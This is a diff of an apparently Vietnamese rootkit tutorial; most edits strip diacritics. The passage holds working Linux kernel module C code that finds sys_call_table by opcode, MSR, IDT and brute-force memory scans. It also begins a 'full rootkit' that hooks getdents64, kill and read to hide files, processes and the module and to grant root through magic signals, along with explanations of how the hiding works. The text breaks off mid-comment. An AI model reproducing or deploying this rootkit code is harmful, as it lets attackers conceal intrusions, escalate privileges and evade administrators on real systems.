+     * Kernel code (entry_64.S) chua instruction dang:
      *   call *sys_call_table(, %rax, 8)
      *
      * Encoding x86-64:
      *   ff 14 c5 [4-byte displacement]
      *
      *   ff 14 c5 = call *disp32(,%rax,8)
-     *   Nghĩa: gọi function tại address (disp32 + rax * 8)
-     *   disp32 = 32-bit sign-extended address (lower 32 bits của sys_call_table)
+     *   Nghia: goi function tai address (disp32 + rax * 8)
+     *   disp32 = 32-bit sign-extended address (lower 32 bits cua sys_call_table)
      *
-     * Trên kernel mới (>= 4.17), pattern có thể khác:
+     * Tren kernel moi (>= 4.17), pattern co the khac:
      *   mov sys_call_table(, %rax, 8), %rax
      *   call *%rax
-     *   → Pattern: 48 8b 04 c5 [disp32]
+     *   -> Pattern: 48 8b 04 c5 [disp32]
      *
-     * Ta scan cả hai patterns.
+     * Ta scan ca hai patterns.
      */
     for (i = 0; i < 1024; i++) {
         /* Pattern 1: ff 14 c5 xx xx xx xx
@@ -775,16 +1317,16 @@ static unsigned long *method_3_msr_scan(void)
             code_ptr[i + 2] == 0xc5) {
 
             /* Extract 4-byte displacement.
-             * Đây là lower 32 bits của sys_call_table address.
+             * Day la lower 32 bits cua sys_call_table address.
              *
-             * Trên x86-64, kernel addresses bắt đầu từ 0xFFFF...
-             * nhưng instruction chỉ encode 32 bits.
-             * Sign extension: 32-bit value bị sign-extend lên 64-bit.
-             * Nếu bit 31 = 1 → upper 32 bits = 0xFFFFFFFF.
+             * Tren x86-64, kernel addresses bat dau tu 0xFFFF...
+             * nhung instruction chi encode 32 bits.
+             * Sign extension: 32-bit value bi sign-extend len 64-bit.
+             * Neu bit 31 = 1 -> upper 32 bits = 0xFFFFFFFF.
              *
-             * Ví dụ: displacement = 0x82200300
+             * Vi du: displacement = 0x82200300
              * Sign-extended = 0xFFFFFFFF82200300
-             * → đây là kernel virtual address.
+             * -> day la kernel virtual address.
              */
             int disp32 = *(int *)(code_ptr + i + 3);
             table = (unsigned long *)((long)disp32);
@@ -818,26 +1360,26 @@ static unsigned long *method_3_msr_scan(void)
 }
 
 /* ──────────────────────────────────────────────────────────────
- * METHOD 4: IDT scan — Dùng Interrupt Descriptor Table
+ * METHOD 4: IDT scan — Dung Interrupt Descriptor Table
  *
- * Nguyên lý:
- *   INT 0x80 (legacy 32-bit syscall) vẫn tồn tại trên x86-64.
- *   IDT entry 0x80 chứa handler cho INT 0x80.
- *   Handler này cũng reference ia32_sys_call_table.
- *   Từ đó trace tới sys_call_table.
+ * Nguyen ly:
+ *   INT 0x80 (legacy 32-bit syscall) van ton tai tren x86-64.
+ *   IDT entry 0x80 chua handler cho INT 0x80.
+ *   Handler nay cung reference ia32_sys_call_table.
+ *   Tu do trace toi sys_call_table.
  *
- * Ít tin cậy hơn MSR scan nhưng là fallback hữu ích.
+ * It tin cay hon MSR scan nhung la fallback huu ich.
  * ────────────────────────────────────────────────────────────── */
 
 /* IDT Entry structure (x86-64) — 16 bytes per entry */
 struct idt_entry_t {
-    u16 offset_low;    /* Bits 0-15 của handler address */
+    u16 offset_low;    /* Bits 0-15 cua handler address */
     u16 segment;       /* Code segment selector */
     u8  ist;           /* Interrupt Stack Table index */
     u8  type_attr;     /* Type and attributes (P, DPL, type) */
     u16 offset_mid;    /* Bits 16-31 */
     u32 offset_high;   /* Bits 32-63 */
-    u32 reserved;      /* Phải là 0 */
+    u32 reserved;      /* Phai la 0 */
 } __attribute__((packed));
 
 static unsigned long *method_4_idt_scan(void)
@@ -848,21 +1390,21 @@ static unsigned long *method_4_idt_scan(void)
     unsigned char *handler;
     int i;
 
-    /* SIDT instruction lưu IDT Register vào memory.
-     * idtr.address = base address của IDT
-     * idtr.size = size của IDT (256 entries * 16 bytes - 1)
+    /* SIDT instruction luu IDT Register vao memory.
+     * idtr.address = base address cua IDT
+     * idtr.size = size cua IDT (256 entries * 16 bytes - 1)
      *
-     * IDT không bị randomize bởi KASLR (nó nằm fixed trong
-     * kernel BSS section), nhưng handler addresses bên trong
-     * đã bị randomize. */
+     * IDT khong bi randomize boi KASLR (no nam fixed trong
+     * kernel BSS section), nhung handler addresses ben trong
+     * da bi randomize. */
     asm volatile("sidt %0" : "=m"(idtr));
 
     idt = (struct idt_entry_t *)idtr.address;
 
-    /* Reconstruct handler address từ IDT entry #0x80
+    /* Reconstruct handler address tu IDT entry #0x80
      * (Legacy syscall interrupt — INT 0x80)
      *
-     * Address bị split thành 3 parts trong IDT entry:
+     * Address bi split thanh 3 parts trong IDT entry:
      *   [offset_high:offset_mid:offset_low] = 64-bit address */
     handler_addr = ((unsigned long)idt[0x80].offset_high << 32)
                  | ((unsigned long)idt[0x80].offset_mid  << 16)
@@ -870,8 +1412,8 @@ static unsigned long *method_4_idt_scan(void)
 
     pr_info("method_4: INT 0x80 handler @ 0x%lx\n", handler_addr);
 
-    /* Scan handler code tìm reference tới ia32_sys_call_table
-     * hoặc sys_call_table. Pattern tương tự MSR scan. */
+    /* Scan handler code tim reference toi ia32_sys_call_table
+     * hoac sys_call_table. Pattern tuong tu MSR scan. */
     handler = (unsigned char *)handler_addr;
     for (i = 0; i < 1024; i++) {
         if (handler[i] == 0xff &&
@@ -881,8 +1423,8 @@ static unsigned long *method_4_idt_scan(void)
             unsigned long *table = (unsigned long *)((long)disp32);
             pr_info("method_4 (IDT): ia32 table @ 0x%lx\n",
                     (unsigned long)table);
-            /* Đây có thể là ia32_sys_call_table (32-bit compat).
-             * Cần thêm logic để tìm 64-bit sys_call_table từ đây. */
+            /* Day co the la ia32_sys_call_table (32-bit compat).
+             * Can them logic de tim 64-bit sys_call_table tu day. */
             return table;
         }
     }
@@ -893,28 +1435,28 @@ static unsigned long *method_4_idt_scan(void)
 /* ──────────────────────────────────────────────────────────────
  * METHOD 5: Brute-force memory scan
  *
- * Nguyên lý:
- *   Biết address của một vài syscall handlers (qua kprobe),
- *   scan kernel memory tìm array chứa những addresses đó
- *   theo đúng thứ tự = sys_call_table.
+ * Nguyen ly:
+ *   Biet address cua mot vai syscall handlers (qua kprobe),
+ *   scan kernel memory tim array chua nhung addresses do
+ *   theo dung thu tu = sys_call_table.
  *
- * Đây là phương pháp "desperate" — dùng khi mọi cách khác fail.
- * Nhưng conceptually enlightening: cho thấy sys_call_table
- * chỉ là một mảng trong kernel memory, không có gì magic.
+ * Day la phuong phap "desperate" — dung khi moi cach khac fail.
+ * Nhung conceptually enlightening: cho thay sys_call_table
+ * chi la mot mang trong kernel memory, khong co gi magic.
  *
- * Phiên bản an toàn: dùng copy_from_kernel_nofault() để tránh
- * crash khi đọc unmapped pages, và giới hạn scan range trong
- * kernel text+data section thay vì quét toàn bộ address space.
+ * Phien ban an toan: dung copy_from_kernel_nofault() de tranh
+ * crash khi doc unmapped pages, va gioi han scan range trong
+ * kernel text+data section thay vi quet toan bo address space.
  * ────────────────────────────────────────────────────────────── */
 static unsigned long *method_5_bruteforce(void)
 {
     unsigned long *ptr;
     unsigned long test_val;
 
-    /* Chỉ scan kernel text + data range, KHÔNG scan toàn bộ.
-     * Kernel text: _stext → _etext
-     * Kernel data: _sdata → _edata
-     * Dùng range rộng hơn nhưng bounded. */
+    /* Chi scan kernel text + data range, KHONG scan toan bo.
+     * Kernel text: _stext -> _etext
+     * Kernel data: _sdata -> _edata
+     * Dung range rong hon nhung bounded. */
     unsigned long scan_start = (unsigned long)rk_lookup_name("_stext");
     unsigned long scan_end   = (unsigned long)rk_lookup_name("_edata");
 
@@ -927,10 +1469,10 @@ static unsigned long *method_5_bruteforce(void)
          (unsigned long)ptr < scan_end;
          ptr++) {
 
-        /* Safe read — không crash nếu address unmapped */
+        /* Safe read — khong crash neu address unmapped */
         if (copy_from_kernel_nofault(&test_val, ptr,
                                       sizeof(test_val)))
-            continue;  /* Unmapped page → skip */
+            continue;  /* Unmapped page -> skip */
 
         if (test_val == (unsigned long)rk_lookup_name(
                 SYSCALL_PREFIX "read")) {
@@ -952,14 +1494,14 @@ static unsigned long *method_5_bruteforce(void)
 /* ──────────────────────────────────────────────────────────────
  * METHOD 6: /proc/kallsyms userland helper
  *
- * Concept: parse /proc/kallsyms từ TRONG kernel.
- * /proc/kallsyms chứa address của mọi symbol (nếu kptr_restrict=0).
+ * Concept: parse /proc/kallsyms tu TRONG kernel.
+ * /proc/kallsyms chua address cua moi symbol (neu kptr_restrict=0).
  *
- * Nhưng: kernel code thường dùng API thay vì đọc procfs.
- * Phương pháp này hữu ích khi tất cả API-based methods fail.
+ * Nhung: kernel code thuong dung API thay vi doc procfs.
+ * Phuong phap nay huu ich khi tat ca API-based methods fail.
  *
- * Alternative: userland program đọc /proc/kallsyms rồi
- * gửi address vào kernel module qua ioctl hoặc /proc write.
+ * Alternative: userland program doc /proc/kallsyms roi
+ * gui address vao kernel module qua ioctl hoac /proc write.
  * ────────────────────────────────────────────────────────────── */
 static unsigned long *method_6_kallsyms_file(void)
 {
@@ -969,24 +1511,24 @@ static unsigned long *method_6_kallsyms_file(void)
     ssize_t bytes;
     unsigned long addr = 0;
 
-    /* Mở /proc/kallsyms từ kernel context.
-     * filp_open() là kernel equivalent của open(). */
+    /* Mo /proc/kallsyms tu kernel context.
+     * filp_open() la kernel equivalent cua open(). */
     f = filp_open("/proc/kallsyms", O_RDONLY, 0);
     if (IS_ERR(f)) {
         pr_err("method_6: cannot open /proc/kallsyms\n");
         return NULL;
     }
 
-    /* Đọc file line by line tìm "sys_call_table" */
+    /* Doc file line by line tim "sys_call_table" */
     while ((bytes = kernel_read(f, buf, sizeof(buf) - 1, &pos)) > 0) {
         buf[bytes] = '\0';
 
-        /* Tìm "sys_call_table" trong buffer.
+        /* Tim "sys_call_table" trong buffer.
          * Format: "ffffffff82200300 R sys_call_table" */
         char *found = strstr(buf, " sys_call_table");
         if (found) {
-            /* Parse hex address từ đầu dòng.
-             * Tìm ngược từ match point tới đầu dòng. */
+            /* Parse hex address tu dau dong.
+             * Tim nguoc tu match point toi dau dong. */
             char *line_start = found;
             while (line_start > buf && *(line_start - 1) != '\n')
                 line_start--;
@@ -1006,9 +1548,9 @@ static unsigned long *method_6_kallsyms_file(void)
 }
 
 /* ──────────────────────────────────────────────────────────────
- * VALIDATION — Verify rằng address thật sự là sys_call_table
+ * VALIDATION — Verify rang address that su la sys_call_table
  *
- * Sau khi tìm được candidate address, phải verify.
+ * Sau khi tim duoc candidate address, phai verify.
  * False positive = crash khi hook.
  * ────────────────────────────────────────────────────────────── */
 static bool validate_syscall_table(unsigned long *table)
@@ -1017,12 +1559,12 @@ static bool validate_syscall_table(unsigned long *table)
 
     if (!table) return false;
 
-    /* Verify bằng cách check một vài known entries.
+    /* Verify bang cach check mot vai known entries.
      *
-     * sys_call_table[__NR_close] phải = address của __x64_sys_close
-     * sys_call_table[__NR_read] phải = address của __x64_sys_read
+     * sys_call_table[__NR_close] phai = address cua __x64_sys_close
+     * sys_call_table[__NR_read] phai = address cua __x64_sys_read
      *
-     * Nếu match → confidence cao là sys_call_table thật. */
+     * Neu match -> confidence cao la sys_call_table that. */
     known_handler = rk_lookup_name(SYSCALL_PREFIX "close");
     if (!known_handler) {
         pr_warn("validate: cannot resolve known handler\n");
@@ -1036,9 +1578,9 @@ static bool validate_syscall_table(unsigned long *table)
         return false;
     }
 
-    /* Thêm check: mọi entry phải trỏ vào kernel text section.
-     * Kernel text nằm trong range [_stext, _etext].
-     * Entry trỏ ra ngoài range = table sai hoặc đã bị hook. */
+    /* Them check: moi entry phai tro vao kernel text section.
+     * Kernel text nam trong range [_stext, _etext].
+     * Entry tro ra ngoai range = table sai hoac da bi hook. */
     unsigned long stext = rk_lookup_name("_stext");
     unsigned long etext = rk_lookup_name("_etext");
 
@@ -1047,8 +1589,8 @@ static bool validate_syscall_table(unsigned long *table)
             if (table[i] < stext || table[i] > etext) {
                 pr_warn("validate: entry %d (0x%lx) outside kernel text\n",
                         i, table[i]);
-                /* Không return false ngay — có thể entry hợp lệ
-                 * nhưng nằm trong module area. Log và tiếp tục. */
+                /* Khong return false ngay — co the entry hop le
+                 * nhung nam trong module area. Log va tiep tuc. */
             }
         }
     }
@@ -1058,30 +1600,30 @@ static bool validate_syscall_table(unsigned long *table)
 }
 
 /* ──────────────────────────────────────────────────────────────
- * UNIFIED FINDER — Thử tất cả methods theo thứ tự reliability
+ * UNIFIED FINDER — Thu tat ca methods theo thu tu reliability
  * ────────────────────────────────────────────────────────────── */
 static unsigned long *find_syscall_table(void)
 {
     unsigned long *table;
 
-    /* Method 2 (kprobe) là reliable nhất trên kernel hiện đại */
+    /* Method 2 (kprobe) la reliable nhat tren kernel hien dai */
     table = method_2_kprobe();
     if (table && validate_syscall_table(table))
         return table;
 
-    /* Method 3 (MSR scan) — không dùng API, pure scan */
+    /* Method 3 (MSR scan) — khong dung API, pure scan */
     table = method_3_msr_scan();
     if (table && validate_syscall_table(table))
         return table;
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5, 7, 0)
-    /* Method 1 chỉ available trên kernel cũ */
+    /* Method 1 chi available tren kernel cu */
     table = method_1_kallsyms();
     if (table && validate_syscall_table(table))
         return table;
 #endif
 
-    /* Method 5 (bruteforce) — slow nhưng thorough */
+    /* Method 5 (bruteforce) — slow nhung thorough */
     table = method_5_bruteforce();
     if (table && validate_syscall_table(table))
         return table;
@@ -1094,31 +1636,303 @@ static unsigned long *find_syscall_table(void)
 
 ## Chapter 3: Syscall Table Hooking — Full Rootkit
 
+### 3.0 Syscall Hooking Internals — Cau truc du lieu va luong xu ly
+
+Truoc khi doc code hooking, ban can hieu ba dieu: (1) cau truc du lieu ma syscall tra ve cho userspace, (2) luong xu ly cua syscall getdents64 trong kernel, va (3) cach kernel truyen du lieu giua user/kernel space. Day la nen tang de hieu tai sao hook code duoc viet nhu vay.
+
+#### struct linux_dirent64 — Layout chi tiet trong memory
+
+Khi userspace goi `getdents64()`, kernel tra ve mot buffer chua nhieu entries lien tiep. Moi entry la mot `struct linux_dirent64`:
+
+```
+struct linux_dirent64 layout trong memory:
+(defined trong include/linux/dirent.h)
+
+Offset  Size   Field        Mo ta
+------  ----   -----        -----
++0      8      d_ino        (u64) Inode number cua file/directory.
+                             Duy nhat trong 1 filesystem.
+                             Co the gia mao de an: set = 0 (nhung apps
+                             thuong khong check).
+
++8      8      d_off        (s64) Offset toi dirent KE TIEP trong 
+                             directory stream. Dung boi lseek/telldir.
+                             KHONG phai offset trong buffer.
+
++16     2      d_reclen     (u16) Tong kich thuoc cua ENTRY NAY
+                             (bao gom header + name + padding).
+                             Userspace dung gia tri nay de nhay toi
+                             entry ke tiep: next = (char*)cur + d_reclen
+                             Day la field rootkit exploit de "nuot" entries.
+
++18     1      d_type       (u8) Loai file:
+                             DT_REG  = 8  (regular file)
+                             DT_DIR  = 4  (directory)
+                             DT_LNK  = 10 (symbolic link)
+                             DT_SOCK = 12 (socket)
+                             DT_FIFO = 1  (named pipe)
+                             DT_BLK  = 6  (block device)
+                             DT_CHR  = 2  (character device)
+
++19     var    d_name[]     (char[]) Filename, null-terminated.
+                             Do dai thay doi (1 byte cho "." den 255 bytes).
+                             Padding sau null byte de d_reclen aligned.
+
+        padding              Bytes 0 cho den d_reclen boundary.
+                             Tong d_reclen thuong aligned 8 bytes.
++d_reclen                    --- Entry ke tiep bat dau tai day ---
+
+
+Vi du cu the — buffer chua 3 entries:
+
+Offset   Hex dump                              Decoded
+------   --------                              -------
+0x0000   01 00 00 00 00 00 00 00              d_ino = 1
+0x0008   18 00 00 00 00 00 00 00              d_off = 24
+0x0010   18 00                                d_reclen = 24
+0x0012   04                                   d_type = DT_DIR (4)
+0x0013   2E 00 00 00 00                       d_name = ".\0" + 3 padding
+                                              --- entry 1: "." (current dir) ---
+
+0x0018   02 00 00 00 00 00 00 00              d_ino = 2
+0x0020   30 00 00 00 00 00 00 00              d_off = 48
+0x0028   18 00                                d_reclen = 24
+0x002A   04                                   d_type = DT_DIR
+0x002B   2E 2E 00 00 00                       d_name = "..\0" + 2 padding
+                                              --- entry 2: ".." (parent dir) ---
+
+0x0030   A1 03 00 00 00 00 00 00              d_ino = 929
+0x0038   48 00 00 00 00 00 00 00              d_off = 72
+0x0040   20 00                                d_reclen = 32
+0x0042   08                                   d_type = DT_REG (8)
+0x0043   72 6B 5F 63 6F 6E 66 69 67 00 00 .. d_name = "rk_config\0" + pad
+                                              --- entry 3: "rk_config" (HIDDEN!) ---
+
+Return value cua getdents64 = 0x0060 (96 bytes = tong d_reclen)
+
+Sau khi rootkit filter entry 3:
+  - Neu entry 3 la entry dau: memmove entries 1,2 len, ret = 48
+  - Neu entry 3 o giua: entry_truoc->d_reclen += 32, ret giu nguyen
+    (nhung userspace se nhay qua entry 3)
+```
+
+#### getdents64 syscall flow trong kernel
+
+Day la luong xu ly day du khi userspace goi `getdents64(fd, buf, count)`:
+
+```
+sys_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, 
+               unsigned int count)
+  |
+  v
+f = fdget(fd)                      // Lay struct file* tu fd number
+  |                                // fdget() dung files_struct cua process
+  |                                // files_struct->fd_array[fd] = file*
+  v
+iterate_dir(f.file, &buf.ctx)      // Bat dau iterate directory
+  |
+  |  buf la struct getdents_callback64:
+  |    .ctx.actor = filldir64      // Callback function cho moi entry
+  |    .current_dir = dirent       // User buffer pointer
+  |    .count = count              // Buffer size remaining
+  |
+  v
+f.file->f_op->iterate_shared(file, ctx)
+  |
+  |  f_op la file_operations cua filesystem:
+  |    ext4:    ext4_readdir()
+  |    procfs:  proc_readdir() -> proc_pid_readdir()
+  |    tmpfs:   dcache_readdir()
+  |    ...
+  |
+  |  Filesystem-specific code iterate entries va goi:
+  v
+dir_emit(ctx, name, namlen, ino, type)
+  |
+  |  dir_emit() goi ctx->actor() = filldir64()
+  v
+filldir64(ctx, name, namlen, offset, ino, d_type)
+  |
+  |  1. Check buf->count >= reclen (con du space?)
+  |  2. Build linux_dirent64 entry:
+  |     - d_ino = ino
+  |     - d_off = offset  
+  |     - d_reclen = ALIGN(offsetof(d_name) + namlen + 1, 8)
+  |     - d_type = d_type
+  |     - d_name = name (copy name string)
+  |  3. copy_to_user(buf->current_dir, &entry, reclen)
+  |     (TRUC TIEP ghi vao userspace buffer)
+  |  4. buf->current_dir += reclen
+  |  5. buf->count -= reclen
+  |  6. Return 0 (success) hoac -EFAULT (copy failed)
+  v
+[... repeat cho moi directory entry ...]
+  |
+  v
+Return total bytes written = count - buf.count
+```
+
+Quan trong: `filldir64()` ghi TRUC TIEP vao userspace buffer. Khi rootkit hook getdents64, original handler da ghi data vao userspace. Rootkit phai copy tu userspace vao kernel, filter, roi copy nguoc lai.
+
+#### procfs /proc/<pid> — Virtual filesystem internals
+
+`/proc` la mot pseudo-filesystem (khong co backing storage tren disk). Moi file/directory trong /proc duoc tao DYNAMICALLY khi duoc access:
+
+```
+procfs architecture:
+                                    
+/proc/                              
+  |-- 1/         <- proc_pid_readdir() tao entry nay cho PID 1
+  |   |-- status <- proc_pid_status() generate noi dung
+  |   |-- maps   <- proc_pid_maps()
+  |   |-- cmdline<- proc_pid_cmdline()
+  |   +-- ...    
+  |-- 1234/      <- PID 1234 (tuong tu)
+  |-- self/      <- symlink toi /proc/<current PID>
+  |-- cpuinfo    <- cpuinfo_open() -> seq_file
+  |-- modules    <- modules_open() -> iterate module list
+  |-- net/       
+  |   |-- tcp    <- tcp4_seq_show() cho moi connection
+  |   +-- udp    <- udp4_seq_show()
+  +-- kallsyms   <- kallsyms_open()
+
+Khi ls /proc:
+  1. getdents64(fd_of_proc, buf, count)
+  2. iterate_dir() -> proc_readdir()
+  3. proc_readdir() goi proc_pid_readdir() cho PID entries
+  4. proc_pid_readdir():
+     - Goi for_each_process(task) 
+       (iterate TOAN BO task_struct linked list)
+     - Cho moi task, goi:
+       tgid_nr_ns(task, &init_pid_ns) -> lay PID number
+     - Goi dir_emit(ctx, pid_string, ...) -> filldir64()
+       -> ghi PID entry vao user buffer
+
+Rootkit an process = lam cho filldir64 KHONG duoc goi cho PID do.
+Cach 1: Hook getdents64, filter entry SAU KHI kernel da ghi (post-hook)
+Cach 2: DKOM — remove task tu linked list (Chapter 6)
+Cach 3: Hook proc_pid_readdir() truc tiep (kho hon nhung sach hon)
+```
+
+#### pt_regs va syscall arguments tren x86-64
+
+Tu kernel 4.17+, tat ca syscall handlers nhan `const struct pt_regs *regs` thay vi arguments truc tiep. Day la mapping giua registers va pt_regs fields:
+
+```
+struct pt_regs (defined trong arch/x86/include/asm/ptrace.h):
++-----------------------------------------------------------+
+| Offset | Field     | Register | Syscall role               |
++--------+-----------+----------+----------------------------+
+|   0    | r15       | R15      | (callee-saved)             |
+|   8    | r14       | R14      | (callee-saved)             |
+|  16    | r13       | R13      | (callee-saved)             |
+|  24    | r12       | R12      | (callee-saved)             |
+|  32    | bp        | RBP      | (frame pointer)            |
+|  40    | bx        | RBX      | (callee-saved)             |
+|  48    | r11       | R11      | (saved RFLAGS by SYSCALL)  |
+|  56    | r10       | R10      | Syscall arg4               |
+|  64    | r9        | R9       | Syscall arg6               |
+|  72    | r8        | R8       | Syscall arg5               |
+|  80    | ax        | RAX      | RETURN VALUE (sau syscall)  |
+|  88    | cx        | RCX      | (saved RIP by SYSCALL)     |
+|  96    | dx        | RDX      | Syscall arg3               |
+| 104    | si        | RSI      | Syscall arg2               |
+| 112    | di        | RDI      | Syscall arg1               |
+| 120    | orig_ax   | (saved)  | SYSCALL NUMBER (orig RAX)  |
+| 128    | ip        | RIP      | User instruction pointer   |
+| 136    | cs        | CS       | Code segment               |
+| 144    | flags     | RFLAGS   | User flags                 |
+| 152    | sp        | RSP      | User stack pointer         |
+| 160    | ss        | SS       | Stack segment              |
++-----------------------------------------------------------+
+
+Syscall argument mapping (QUAN TRONG):
+  Argument  Register  pt_regs field  Ghi chu
+  ────────  ────────  ─────────────  ───────
+  syscall#  RAX       regs->orig_ax  KHONG PHAI regs->ax!
+                                     regs->ax = return value
+  arg1      RDI       regs->di       
+  arg2      RSI       regs->si       
+  arg3      RDX       regs->dx       
+  arg4      R10       regs->r10      KHONG PHAI RCX!
+                                     (SYSCALL clobber RCX de save RIP)
+  arg5      R8        regs->r8       
+  arg6      R9        regs->r9       
+  return    RAX       regs->ax       Hook modify field nay de thay
+                                     doi return value
+
+Vi du: getdents64(unsigned int fd, struct linux_dirent64 *dirent, 
+                  unsigned int count)
+  fd     = (unsigned int)regs->di
+  dirent = (struct linux_dirent64 __user *)regs->si
+  count  = (unsigned int)regs->dx
+```
+
+#### copy_to_user / copy_from_user — Kernel<->User data transfer
+
+Kernel code KHONG DUOC truc tiep dereference user pointers. Phai dung `copy_from_user()` va `copy_to_user()`:
+
+```
+Tai sao KHONG the dung memcpy/pointer dereference:
+
+1. SMAP (Supervisor Mode Access Prevention) — CPU feature:
+   Khi SMAP enabled (CR4.SMAP = 1), Ring 0 code KHONG the
+   doc/ghi user pages. Violation -> #PF (page fault).
+   copy_from_user() tam thoi disable SMAP bang STAC instruction,
+   copy xong roi CLAC enable lai.
+
+2. Page fault handling:
+   User page co the swapped out (on disk, khong co trong RAM).
+   memcpy se crash (page fault trong kernel = oops).
+   copy_from_user() co exception table entry -> neu fault xay ra,
+   tra ve error thay vi crash.
+
+3. Address validation:
+   access_ok(addr, size) kiem tra addr + size nam trong user range
+   (< TASK_SIZE, thuong = 0x00007FFFFFFFFFFF tren x86-64).
+   Ngan kernel doc/ghi kernel memory qua user pointer (Confused Deputy).
+
+4. __user annotation:
+   Day la compile-time marker (khong anh huong runtime).
+   sparse checker canh bao neu ban dereference __user pointer truc tiep.
+   Giup developer khong quen dung copy_from_user/copy_to_user.
+
+Internally, copy_from_user(kernel_dst, user_src, size):
+  1. access_ok(user_src, size)  // check range
+  2. stac                       // disable SMAP
+  3. memcpy with exception handling
+     (neu page fault -> return bytes NOT copied)
+  4. clac                       // re-enable SMAP
+  5. Return 0 (success) hoac N (N bytes khong copy duoc)
+```
+
+---
+
 ### 3.1 Complete hookable rootkit — File & Process Hiding + Give Root
 
 ```c
 /* hooks.c — Syscall hooking engine
  *
- * File này implement:
- * 1. Hook getdents64: ẩn files và processes (trong /proc)
+ * File nay implement:
+ * 1. Hook getdents64: an files va processes (trong /proc)
  * 2. Hook kill: magic signal triggers (give root, hide module, hide PID)
  * 3. Hook read: filter /proc/modules output (backup hiding cho module)
  *
  * Architecture:
- *   Original flow:     user → syscall → ORIGINAL_HANDLER → return
- *   Hooked flow:       user → syscall → OUR_HOOK → ORIGINAL_HANDLER → OUR_FILTER → return
+ *   Original flow:     user -> syscall -> ORIGINAL_HANDLER -> return
+ *   Hooked flow:       user -> syscall -> OUR_HOOK -> ORIGINAL_HANDLER -> OUR_FILTER -> return
  *
- *   Hook function wrap original: gọi original handler, rồi modify kết quả
- *   trước khi return cho user. Đây gọi là "post-hook" pattern.
+ *   Hook function wrap original: goi original handler, roi modify ket qua
+ *   truoc khi return cho user. Day goi la "post-hook" pattern.
  *
- *   Có 2 patterns:
- *   a) Pre-hook:  modify arguments TRƯỚC KHI gọi original
- *                 Ví dụ: thay filename argument → redirect file access
- *   b) Post-hook: gọi original TRƯỚC, rồi modify return value/buffer
- *                 Ví dụ: gọi getdents64 thật, rồi filter entries từ result
+ *   Co 2 patterns:
+ *   a) Pre-hook:  modify arguments TRUOC KHI goi original
+ *                 Vi du: thay filename argument -> redirect file access
+ *   b) Post-hook: goi original TRUOC, roi modify return value/buffer
+ *                 Vi du: goi getdents64 that, roi filter entries tu result
  *
- *   Rootkit thường dùng post-hook cho hiding (để original function
- *   vẫn thu thập data đầy đủ, ta chỉ lọc bỏ entries cần ẩn).
+ *   Rootkit thuong dung post-hook cho hiding (de original function
+ *   van thu thap data day du, ta chi loc bo entries can an).
  */
 
 #include "rootkit.h"
@@ -1127,19 +1941,19 @@ static unsigned long *find_syscall_table(void)
  * GLOBAL STATE
  * ══════════════════════════════════════════════════════════════ */
 
-/* Pointer tới sys_call_table — set bởi find_syscall_table() */
+/* Pointer toi sys_call_table — set boi find_syscall_table() */
 static unsigned long *sys_call_table = NULL;
 
-/* Save original syscall handlers để:
- * 1. Gọi trong hook function (cần original behavior)
+/* Save original syscall handlers de:
+ * 1. Goi trong hook function (can original behavior)
  * 2. Restore khi unload module (clean exit) */
 static syscall_fn_t orig_getdents64 = NULL;
 static syscall_fn_t orig_getdents   = NULL;
 static syscall_fn_t orig_kill       = NULL;
 static syscall_fn_t orig_read       = NULL;
 
-/* Danh sách PIDs đang bị ẩn.
- * Giới hạn static 64 PIDs. Sản phẩm thật dùng dynamic list. */
+/* Danh sach PIDs dang bi an.
+ * Gioi han static 64 PIDs. San pham that dung dynamic list. */
 #define MAX_HIDDEN_PIDS 64
 static pid_t hidden_pids[MAX_HIDDEN_PIDS];
 static int hidden_pid_count = 0;
@@ -1149,7 +1963,7 @@ static DEFINE_SPINLOCK(pid_lock);  /* Lock cho concurrent access */
 static bool module_hidden = false;
 
 /* ══════════════════════════════════════════════════════════════
- * PID MANAGEMENT — Track processes cần ẩn
+ * PID MANAGEMENT — Track processes can an
  * ══════════════════════════════════════════════════════════════ */
 
 static bool is_pid_hidden(pid_t pid)
@@ -1195,19 +2009,19 @@ static void remove_hidden_pid(pid_t pid)
 }
 
 /* ══════════════════════════════════════════════════════════════
- * HOOK: getdents64 — Ẩn files và processes
+ * HOOK: getdents64 — An files va processes
  *
- * getdents64() là syscall đứng sau ls, find, readdir().
+ * getdents64() la syscall dung sau ls, find, readdir().
  *
- * Flow bình thường:
- *   ls → getdents64(fd, buffer, bufsize) → kernel fills buffer
- *   với mảng struct linux_dirent64:
+ * Flow binh thuong:
+ *   ls -> getdents64(fd, buffer, bufsize) -> kernel fills buffer
+ *   voi mang struct linux_dirent64:
  *
- *   ┌────────────┬────────────┬────────────┬─────┐
- *   │ dirent #1  │ dirent #2  │ dirent #3  │ ... │
- *   └────────────┴────────────┴────────────┴─────┘
+ *   +------------+------------+------------+-----+
+ *   | dirent #1  | dirent #2  | dirent #3  | ... |
+ *   +------------+------------+------------+-----+
  *
- *   Mỗi dirent:
+ *   Moi dirent:
  *   struct linux_dirent64 {
  *       u64  d_ino;        // Inode number
  *       s64  d_off;        // Offset to next dirent
@@ -1216,44 +2030,44 @@ static void remove_hidden_pid(pid_t pid)
  *       char d_name[];     // Filename (null-terminated, variable length)
  *   };
  *
- *   d_reclen là variable vì d_name có độ dài khác nhau.
- *   Các dirents packed liên tiếp, không padding.
- *   Tổng kích thước tất cả dirents = return value của getdents64().
+ *   d_reclen la variable vi d_name co do dai khac nhau.
+ *   Cac dirents packed lien tiep, khong padding.
+ *   Tong kich thuoc tat ca dirents = return value cua getdents64().
  *
  * Hook strategy:
- *   1. Gọi original getdents64() → kernel fill buffer trong userspace
- *   2. Copy buffer từ userspace vào kernelspace
- *   3. Duyệt từng dirent, lọc bỏ entries cần ẩn
- *   4. Copy kết quả filtered trở lại userspace
- *   5. Return adjusted size (giảm đi size của entries bị lọc)
+ *   1. Goi original getdents64() -> kernel fill buffer trong userspace
+ *   2. Copy buffer tu userspace vao kernelspace
+ *   3. Duyet tung dirent, loc bo entries can an
+ *   4. Copy ket qua filtered tro lai userspace
+ *   5. Return adjusted size (giam di size cua entries bi loc)
  *
- * Ẩn files:  entry có d_name bắt đầu bằng HIDDEN_PREFIX
- * Ẩn process: fd trỏ tới /proc, d_name là PID nằm trong hidden_pids[]
+ * An files:  entry co d_name bat dau bang HIDDEN_PREFIX
+ * An process: fd tro toi /proc, d_name la PID nam trong hidden_pids[]
  * ══════════════════════════════════════════════════════════════ */
 
-/* Kiểm tra fd có đang trỏ tới /proc hay không.
+/* Kiem tra fd co dang tro toi /proc hay khong.
  *
- * Tại sao cần: /proc chứa thư mục cho mỗi process (named by PID).
